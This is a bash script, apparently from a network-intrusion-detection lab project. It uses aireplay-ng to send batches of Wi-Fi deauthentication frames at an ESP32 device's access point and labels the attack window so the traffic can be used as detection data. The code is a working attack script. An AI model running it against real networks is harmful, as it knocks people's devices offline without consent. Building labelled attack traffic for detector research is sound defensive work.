#!/usr/bin/env bash
# Deauth attack + labeling (Kali / monitor mode).
# Usage: sudo -E ./host/attacks/attack_deauth.sh
#
# Channel/BSSID must match airodump (phone hotspots move often):
#   sudo airodump-ng wlan0mon --essid 302
#   export NIDS_BSSID='..' NIDS_WIFI_CHANNEL=N
#   sudo -E ./host/attacks/attack_deauth.sh
#
# After this attack, run: sudo -E ./host/attacks/prepare_wifi.sh managed
# before SYN / ARP.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
  bash "${DIR}/prepare_wifi.sh" monitor
fi

TARGET_MAC="$(get_esp32_mac)"
# BSSID: prefer env; scanning often fails in monitor-only setups
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
else
  BSSID="$(resolve_bssid)" || {
    echo ">>> Could not resolve BSSID. Export NIDS_BSSID=.. (from airodump / AP label)." >&2
    exit 1
  }
fi

# Channel: env > live_state > leave iface as-is
_LIVE_CH="$(_json_field channel 2>/dev/null || true)"
if [[ -n "${NIDS_WIFI_CHANNEL:-}" ]]; then
  CHANNEL="$NIDS_WIFI_CHANNEL"
elif [[ -n "${_LIVE_CH}" && "${_LIVE_CH}" != "null" && "${_LIVE_CH}" != "0" ]]; then
  CHANNEL="${_LIVE_CH}"
else
  CHANNEL=""
fi

if [[ -n "$CHANNEL" ]]; then
  echo ">>> Setting ${MON_IFACE} to channel ${CHANNEL}"
  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null \
    || echo ">>> WARN: could not set channel ${CHANNEL}" >&2
fi

echo ">>> Target ESP32 MAC : $TARGET_MAC"
echo ">>> AP BSSID         : $BSSID"
echo ">>> Channel          : ${CHANNEL:-?(set NIDS_WIFI_CHANNEL from airodump)}"
echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> READY FOR DEAUTH"
echo ">>> Tip: if 'No such BSSID', re-run airodump and export matching BSSID+channel"

send_label START DEAUTH
sleep 0.5

batch=10
repeats=5
for ((i=1; i<=repeats; i++)); do
  echo ">>> Batch ${i}/${repeats}: ${batch} deauth frames"
  # Re-assert channel each batch — some drivers drift after aireplay waits
  if [[ -n "$CHANNEL" ]]; then
    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null || true
  fi
  aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE"
  sleep 0.5
done

sleep 1
send_label STOP DEAUTH
echo " >>> ATTACK FINISHED"
echo " >>> Next for SYN/ARP: sudo -E ./host/attacks/prepare_wifi.sh managed"
